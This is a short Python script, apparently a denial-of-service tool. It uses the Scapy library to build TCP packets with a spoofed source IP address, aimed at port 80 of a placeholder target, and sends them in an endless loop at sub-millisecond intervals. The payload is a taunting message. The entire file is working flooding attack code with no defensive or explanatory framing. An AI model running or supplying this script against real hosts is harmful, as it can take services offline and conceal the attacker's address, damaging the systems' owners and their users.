from scapy.all import *

def floodz(source,target):
	IPlayer = IP(src=source,dst=target)
	TCPlayer = TCP(sport=0,dport=80)
	RAWLayer=Raw(load="Let's pown you with this new idea")
	pkt = IPlayer/TCPlayer/RAWLayer
	send(pkt,inter=0.0001,loop=1)

source = "10.10.10.10"
target = "TARGET_IP"
floodz(source,target)
